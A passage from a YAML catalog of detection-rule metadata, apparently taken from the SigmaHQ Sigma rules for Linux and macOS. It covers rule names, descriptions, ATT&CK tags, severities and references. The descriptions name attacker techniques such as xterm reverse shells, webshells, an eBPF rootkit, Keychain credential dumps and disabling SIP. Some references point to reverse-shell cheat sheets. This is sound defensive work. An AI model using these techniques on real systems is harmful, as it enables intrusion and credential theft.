  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 0cf7a157-8879-41a2-8f55-388dd23746b7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_recon_indicators.yml
  name: Linux Recon Indicators
  description: Detects events with patterns found in commands used for reconnaissance
    on linux systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1552.001
  - T1592.004
  tags:
  - attack.reconnaissance
  - attack.t1592.004
  - attack.credential-access
  - attack.t1552.001
  time_window: ''
  references:
  - https://github.com/sleventyeleven/linuxprivchecker/blob/0d701080bbf92efd464e97d71a70f97c6f2cd658/linuxprivchecker.py
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 86157017-c2b1-4d4a-8c33-93b8e67e4af4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_sensitive_file_access.yml
  name: Potential Suspicious Change To Sensitive/Critical Files
  description: Detects changes of sensitive and critical files. Monitors files that
    you don't expect to change without planning on Linux system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1565.001
  tags:
  - attack.impact
  - attack.t1565.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/defender-for-cloud/file-integrity-monitoring-overview#which-files-should-i-monitor
  false_positives:
  - Some false positives are to be expected on user or administrator machines. Apply
    additional filters as needed.
  notes: ''
- detection_id: 2fade0b6-7423-4835-9d4f-335b39b83867
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_shell_child_process_from_parent_tmp_folder.yml
  name: Shell Execution Of Process Located In Tmp Directory
  description: Detects execution of shells from a parent process located in a temporary
    (/tmp) directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 30bcce26-51c5-49f2-99c8-7b59e3af36c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_susp_shell_script_exec_from_susp_location.yml
  name: Execution Of Script Located In Potentially Suspicious Directory
  description: Detects executions of scripts located in potentially suspicious locations
    such as "/tmp" via a shell such as "bash", "sh", etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 42df45e7-e6e9-43b5-8f26-bec5b39cc239
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_system_info_discovery.yml
  name: System Information Discovery
  description: Detects system information discovery commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: stable
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1082/T1082.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 4c519226-f0cd-4471-bd2f-6fbb2bb68a79
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_system_network_connections_discovery.yml
  name: System Network Connections Discovery - Linux
  description: Detects usage of system utilities to discover system network connections
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1049
  tags:
  - attack.discovery
  - attack.t1049
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: e7bd1cfa-b446-4c88-8afb-403bcd79e3fa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_system_network_discovery.yml
  name: System Network Discovery - Linux
  description: Detects enumeration of local network configuration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  tags:
  - attack.discovery
  - attack.t1016
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1016/T1016.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: c172b7b5-f3a1-4af2-90b7-822c63df86cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_systemctl_mask_power_settings.yml
  name: Mask System Power Settings Via Systemctl
  description: 'Detects the use of systemctl mask to disable system power management
    targets such as suspend, hibernate, or hybrid sleep.

    Adversaries may mask these targets to prevent a system from entering sleep or
    shutdown states, ensuring their malicious processes remain active and uninterrupted.

    This behavior can be associated with persistence or defense evasion, as it impairs
    normal system power operations to maintain long-term access or avoid termination
    of malicious activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  - Persistence
  techniques:
  - T1653
  tags:
  - attack.persistence
  - attack.impact
  - attack.t1653
  time_window: ''
  references:
  - https://www.man7.org/linux/man-pages/man1/systemctl.1.html
  - https://linux-audit.com/systemd/faq/what-is-the-difference-between-systemctl-disable-and-systemctl-mask/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 31545105-3444-4584-bebf-c466353230d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_touch_susp.yml
  name: Touch Suspicious Service File
  description: Detects usage of the "touch" process in service file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.006
  tags:
  - attack.defense-evasion
  - attack.t1070.006
  time_window: ''
  references:
  - https://blogs.blackberry.com/
  - https://twitter.com/Joseliyo_Jstnk/status/1620131033474822144
  false_positives:
  - Admin changing date of files.
  notes: ''
- detection_id: 0326c3c8-7803-4a0f-8c5c-368f747f7c3e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_triple_cross_rootkit_execve_hijack.yml
  name: Triple Cross eBPF Rootkit Execve Hijack
  description: Detects execution of a the file "execve_hijack" which is used by the
    Triple Cross rootkit as a way to elevate privileges
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://github.com/h3xduck/TripleCross/blob/1f1c3e0958af8ad9f6ebe10ab442e75de33e91de/src/helpers/execve_hijack.c#L275
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 22236d75-d5a0-4287-bf06-c93b1770860f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_triple_cross_rootkit_install.yml
  name: Triple Cross eBPF Rootkit Install Commands
  description: Detects default install commands of the Triple Cross eBPF rootkit based
    on the "deployer.sh" script
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1014
  tags:
  - attack.defense-evasion
  - attack.t1014
  time_window: ''
  references:
  - https://github.com/h3xduck/TripleCross/blob/1f1c3e0958af8ad9f6ebe10ab442e75de33e91de/apps/deployer.sh
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 08f26069-6f80-474b-8d1f-d971c6fedea0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_userdel.yml
  name: User Has Been Deleted Via Userdel
  description: Detects execution of the "userdel" binary. Which is used to delete
    a user account and related files. This is sometimes abused by threat actors in
    order to cover their tracks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1531
  tags:
  - attack.impact
  - attack.t1531
  time_window: ''
  references:
  - https://linuxize.com/post/how-to-delete-group-in-linux/
  - https://www.cyberciti.biz/faq/linux-remove-user-command/
  - https://www.cybrary.it/blog/0p3n/linux-commands-used-attackers/
  - https://linux.die.net/man/8/userdel
  false_positives:
  - Legitimate administrator activities
  notes: ''
- detection_id: 6a50f16c-3b7b-42d1-b081-0fdd3ba70a73
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_usermod_susp_group.yml
  name: User Added To Root/Sudoers Group Using Usermod
  description: Detects usage of the "usermod" binary to add users add users to the
    root or suoders groups
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.privilege-escalation
  - attack.persistence
  time_window: ''
  references:
  - https://pberba.github.io/security/2021/11/23/linux-threat-hunting-for-persistence-account-creation-manipulation/
  - https://www.configserverfirewall.com/ubuntu-linux/ubuntu-add-user-to-root-group/
  false_positives:
  - Legitimate administrator activities
  notes: ''
- detection_id: 7ab8f73a-fcff-428b-84aa-6a5ff7877dea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_vim_shell_execution.yml
  name: Vim GTFOBin Abuse - Linux
  description: 'Detects the use of "vim" and it''s siblings commands to execute a
    shell or proxy commands.

    Such behavior may be associated with privilege escalation, unauthorized command
    execution, or to break out from restricted environments.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/vim/
  - https://gtfobins.github.io/gtfobins/rvim/
  - https://gtfobins.github.io/gtfobins/vimdiff/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 818f7b24-0fba-4c49-a073-8b755573b9c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml
  name: Linux Webshell Indicators
  description: Detects suspicious sub processes of web server processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
  - https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF
  false_positives:
  - Web applications that invoke Linux command line tools
  notes: ''
- detection_id: cf610c15-ed71-46e1-bdf8-2bd1a99de6c4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_wget_download_suspicious_directory.yml
  name: Download File To Potentially Suspicious Directory Via Wget
  description: Detects the use of wget to download content to a suspicious directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4e25af4b-246d-44ea-8563-e42aacab006b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_xterm_reverse_shell.yml
  name: Potential Xterm Reverse Shell
  description: Detects usage of "xterm" as a potential reverse shell tunnel
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 23c43900-e732-45a4-8354-63e4a6c187ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/file_event/file_event_macos_emond_launch_daemon.yml
  name: MacOS Emond Launch Daemon
  description: Detects additions to the Emond Launch Daemon that adversaries may use
    to gain persistence and elevate privileges.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.014
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.014
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.014/T1546.014.md
  - https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: dfe8b941-4e54-4242-b674-6b613d521962
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/file_event/file_event_macos_susp_startup_item_created.yml
  name: Startup Item File Created - MacOS
  description: 'Detects the creation of a startup item plist file, that automatically
    get executed at boot initialization to establish persistence.

    Adversaries may use startup items automatically executed at boot initialization
    to establish persistence.

    Startup items execute during the final phase of the boot process and contain shell
    scripts or other executable files along with configuration information used by
    the system to determine the execution order for all startup items.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: macos
  product: macos
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1037.005
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1037.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1037.005/T1037.005.md
  - https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 1bc2e6c5-0885-472b-bed6-be5ea8eace55
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_applescript.yml
  name: MacOS Scripting Interpreter AppleScript
  description: Detects execution of AppleScript of the macOS scripting language AppleScript.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.002
  tags:
  - attack.execution
  - attack.t1059.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.002/T1059.002.md
  - https://redcanary.com/blog/applescript/
  false_positives:
  - Application installers might contain scripts as part of the installation process.
  notes: ''
- detection_id: 719c22d7-c11a-4f2c-93a6-2cfdd5412f68
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_base64_decode.yml
  name: Decode Base64 Encoded Text -MacOs
  description: Detects usage of base64 utility to decode arbitrary base64-encoded
    text
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1027/T1027.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: 95361ce5-c891-4b0a-87ca-e24607884a96
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_binary_padding.yml
  name: Binary Padding - MacOS
  description: Adversaries may use binary padding to add junk data and change the
    on-disk representation of malware. This rule detect using dd and truncate to add
    a junk data to file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027.001
  tags:
  - attack.defense-evasion
  - attack.t1027.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1027.001/T1027.001.md
  - https://linux.die.net/man/1/truncate
  - https://linux.die.net/man/1/dd
  false_positives:
  - Legitimate script work
  notes: ''
- detection_id: 88c0f9d8-30a8-4120-bb6b-ebb54abcf2a0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_change_file_time_attr.yml
  name: File Time Attribute Change
  description: Detect file time attribute change to hide new or changes to existing
    files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.006
  tags:
  - attack.defense-evasion
  - attack.t1070.006
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.006/T1070.006.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3b2c1059-ae5f-40b6-b5d4-6106d3ac20fe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_chflags_hidden_flag.yml
  name: Hidden Flag Set On File/Directory Via Chflags - MacOS
  description: 'Detects the execution of the "chflags" utility with the "hidden" flag,
    in order to hide files on MacOS.

    When a file or directory has this hidden flag set, it becomes invisible to the
    default file listing commands and in graphical file browsers.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1218
  - T1552.001
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.command-and-control
  - attack.t1218
  - attack.t1564.004
  - attack.t1552.001
  - attack.t1105
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/apt32-multi-stage-macos-trojan-innovates-on-crimeware-scripting-technique/
  - https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
  - https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf
  - https://ss64.com/mac/chflags.html
  false_positives:
  - Legitimate usage of chflags by administrators and users.
  notes: ''
- detection_id: acf61bd8-d814-4272-81f0-a7a269aa69aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_clear_system_logs.yml
  name: Indicator Removal on Host - Clear Mac System Logs
  description: Detects deletion of local audit logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.002
  tags:
  - attack.defense-evasion
  - attack.t1070.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.002/T1070.002.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 7794fa3c-edea-4cff-bec7-267dd4770fd7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_clipboard_data_via_osascript.yml
  name: Clipboard Data Collection Via OSAScript
  description: Detects possible collection of data from the clipboard via execution
    of the osascript binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Execution
  techniques:
  - T1059.002
  - T1115
  tags:
  - attack.collection
  - attack.execution
  - attack.t1115
  - attack.t1059.002
  time_window: ''
  references:
  - https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 51719bf5-e4fd-4e44-8ba8-b830e7ac0731
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_create_account.yml
  name: Creation Of A Local User Account
  description: Detects the creation of a new user account. Such accounts may be used
    for persistence that do not require persistent remote access tools to be deployed
    on the system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.t1136.001
  - attack.persistence
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.001/T1136.001.md
  - https://ss64.com/osx/sysadminctl.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: b22a5b36-2431-493a-8be1-0bae56c28ef3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_create_hidden_account.yml
  name: Hidden User Creation
  description: Detects creation of a hidden user account on macOS (UserID < 500) or
    with IsHidden option
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.002
  tags:
  - attack.defense-evasion
  - attack.t1564.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.002/T1564.002.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: b120b587-a4c2-4b94-875d-99c9807d6955
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_creds_from_keychain.yml
  name: Credentials from Password Stores - Keychain
  description: Detects passwords dumps from Keychain
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1555.001
  tags:
  - attack.credential-access
  - attack.t1555.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.001/T1555.001.md
  - https://gist.github.com/Capybara/6228955
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 3603f18a-ec15-43a1-9af2-d196c8a7fec6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_csrutil_disable.yml
  name: System Integrity Protection (SIP) Disabled
  description: 'Detects the use of csrutil to disable the Configure System Integrity
    Protection (SIP). This technique is used in post-exploit scenarios.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518.001
  tags:
  - attack.discovery
  - attack.t1518.001
  time_window: ''
  references:
  - https://ss64.com/osx/csrutil.html
  - https://objective-see.org/blog/blog_0x6D.html
  - https://www.welivesecurity.com/2017/10/20/osx-proton-supply-chain-attack-elmedia/
  - https://www.virustotal.com/gui/file/05a2adb266ec6c0ba9ed176d87d8530e71e845348c13caf9f60049760c312cd3/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 53821412-17b0-4147-ade0-14faae67d54b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_csrutil_status.yml
  name: System Integrity Protection (SIP) Enumeration
  description: 'Detects the use of csrutil to view the Configure System Integrity
    Protection (SIP) status. This technique is used in post-exploit scenarios.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1518.001
  tags:
  - attack.discovery
  - attack.t1518.001
  time_window: ''
  references:
  - https://ss64.com/osx/csrutil.html
  - https://objective-see.org/blog/blog_0x6D.html
  - https://www.welivesecurity.com/2017/10/20/osx-proton-supply-chain-attack-elmedia/
  - https://www.virustotal.com/gui/file/05a2adb266ec6c0ba9ed176d87d8530e71e845348c13caf9f60049760c312cd3/behavior
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: ff39f1a6-84ac-476f-a1af-37fcdf53d7c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_disable_security_tools.yml
  name: Disable Security Tools
  description: Detects disabling security tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: b743623c-2776-40e0-87b1-682b975d0ca5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/macos/process_creation/proc_creation_macos_dscl_add_user_to_admin_group.yml
  name: User Added To Admin Group Via Dscl
  description: Detects attempts to create and add an account to the admin group via
    "dscl"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.003
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.privilege-escalation
  - attack.t1078.003
